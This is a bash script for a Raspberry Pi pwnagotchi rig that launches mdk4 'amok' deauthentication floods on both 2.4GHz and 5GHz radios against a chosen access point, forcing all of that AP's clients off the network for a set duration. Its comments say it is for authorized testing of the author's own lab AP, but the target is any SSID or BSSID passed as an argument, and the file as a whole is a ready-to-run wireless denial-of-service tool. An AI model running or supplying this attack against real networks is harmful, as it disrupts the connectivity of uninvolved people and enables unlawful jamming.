#!/bin/bash
# ACID dual-band deauth FLOOD using mdk4 amok mode on BOTH radios simultaneously:
#   nexmon (wlan0) -> 2.4GHz target,   ACM (MT7612U) -> 5GHz target.
# Pass your OWN lab SSID/BSSID as the target (see Usage). Authorized / own-lab testing only.
# mdk4 'd' watches data traffic and deauths/disassocs all of an AP's clients; -W whitelists the Pi's own wlan1.
# Usage:  sudo acid-flood.sh [seconds]   (default 120). Auto-stops + restarts pwnagotchi (NO system restart needed).
# Run detached:  sudo setsid bash /usr/local/bin/acid-flood.sh 120 </dev/null >/tmp/flood.log 2>&1 &
# Stop early:    sudo touch /tmp/acid_flood_stop
export PATH="/usr/sbin:/usr/bin:/sbin:/bin:$PATH"
DUR=${1:-120}
TARGET=${2:-MyTestAP}   # your own lab AP SSID (substring match) or a BSSID
DCH=${3:-}
SELF=$(cat /sys/class/net/wlan1/address 2>/dev/null | tr 'A-Z' 'a-z')
rm -f /tmp/acid_flood_stop

if [ -n "$DCH" ] && echo "$TARGET" | grep -qiE '^([0-9a-f]{2}:){5}[0-9a-f]{2}$'; then
  INFO="$DCH $(echo "$TARGET" | tr 'A-Z' 'a-z')"
  echo "[flood] DIRECT target: ch$DCH  bssid $(echo "$TARGET" | tr 'A-Z' 'a-z')"
else
  echo "[flood] reading APs matching '$TARGET' from recon..."
  INFO=$(curl -s -u pwnagotchi:pwnagotchi http://127.0.0.1:8081/api/session --max-time 6 2>/dev/null | TARGET="$TARGET" python3 -c "
import sys,json,os
t=os.environ.get('TARGET','MyTestAP').lower()
try:
  d=json.load(sys.stdin)
  for a in d['wifi']['aps']:
    h=str(a.get('hostname','')).lower()
    if t in h:
      ch=a.get('channel') or 0
      if ch: print('%s %s'%(ch,str(a.get('mac','')).lower()))
except Exception: pass
")
  if [ -z "$INFO" ]; then echo "[flood] no APs matching '$TARGET' in recon - is it broadcasting + a device connected/active?"; exit 1; fi
fi
echo "[flood] APs:"; echo "$INFO" | sed 's/^/  /'
AP24=$(echo "$INFO" | awk '$1<=14{print; exit}')
AP5=$(echo "$INFO" | awk '$1>14{print; exit}')

echo "[flood] stopping pwnagotchi to free the ACM (dual-band)..."
systemctl stop pwnagotchi 2>/dev/null; sleep 3
pkill -f mdk4 2>/dev/null; pkill -f aireplay 2>/dev/null
iw dev dmon del 2>/dev/null; iw dev acmmon del 2>/dev/null; iw dev wlan0mon del 2>/dev/null

NPHY=$(cat /sys/class/net/wlan0/phy80211/name 2>/dev/null)
if ! iw phy "$NPHY" interface add dmon type monitor 2>/dev/null; then
  modprobe -r brcmfmac 2>/dev/null; sleep 1; modprobe brcmfmac 2>/dev/null; sleep 3
  NPHY=$(cat /sys/class/net/wlan0/phy80211/name 2>/dev/null); iw phy "$NPHY" interface add dmon type monitor 2>/dev/null
fi
ip link set wlan0 down 2>/dev/null; ip link set dmon up 2>/dev/null

ACM=""
for w in $(ls /sys/class/net | grep '^wlan'); do
  dd=$(readlink -f /sys/class/net/$w/device 2>/dev/null)
  while [ -n "$dd" ] && [ "$dd" != "/" ]; do
    if [ -f "$dd/idVendor" ]; then [ "$(cat $dd/idVendor):$(cat $dd/idProduct)" = "0e8d:7612" ] && ACM=$w; break; fi
    dd=$(dirname "$dd")
  done
done
if [ -n "$ACM" ]; then
  APHY=$(cat /sys/class/net/$ACM/phy80211/name 2>/dev/null)
  iw phy "$APHY" interface add acmmon type monitor 2>/dev/null
  ip link set "$ACM" down 2>/dev/null; ip link set acmmon up 2>/dev/null
fi
sleep 1

WL=""; [ -n "$SELF" ] && WL="-W $SELF"
if [ -n "$AP24" ]; then
  C=$(echo $AP24 | awk '{print $1}'); B=$(echo $AP24 | awk '{print $2}')
  iw dev dmon set channel "$C" 2>/dev/null
  setsid mdk4 dmon d -B "$B" -c "$C" $WL >/dev/null 2>&1 &
  echo "[flood] 2.4GHz mdk4 amok: dmon ch$C -> $B"
fi
if [ -n "$AP5" ] && [ -n "$ACM" ]; then
  C=$(echo $AP5 | awk '{print $1}'); B=$(echo $AP5 | awk '{print $2}')
  iw dev acmmon set channel "$C" 2>/dev/null
  setsid mdk4 acmmon d -B "$B" -c "$C" $WL >/dev/null 2>&1 &
  echo "[flood] 5GHz mdk4 amok: acmmon ch$C -> $B"
fi

echo "[flood] FLOODING both bands for ${DUR}s (mdk4 amok). stop: sudo touch /tmp/acid_flood_stop"
END=$(( $(date +%s) + DUR ))
while [ "$(date +%s)" -lt "$END" ] && [ ! -f /tmp/acid_flood_stop ]; do
  echo "[flood] $(( END - $(date +%s) ))s left | mdk4 running: $(pgrep -c mdk4)"
  sleep 5
done

echo "[flood] stopping + restoring pwnagotchi..."
pkill -f mdk4 2>/dev/null
iw dev dmon del 2>/dev/null; iw dev acmmon del 2>/dev/null
ip link set wlan0 down 2>/dev/null
rm -f /tmp/acid_flood_stop
systemctl start pwnagotchi 2>/dev/null
echo "[flood] DONE. pwnagotchi + monitors restored."
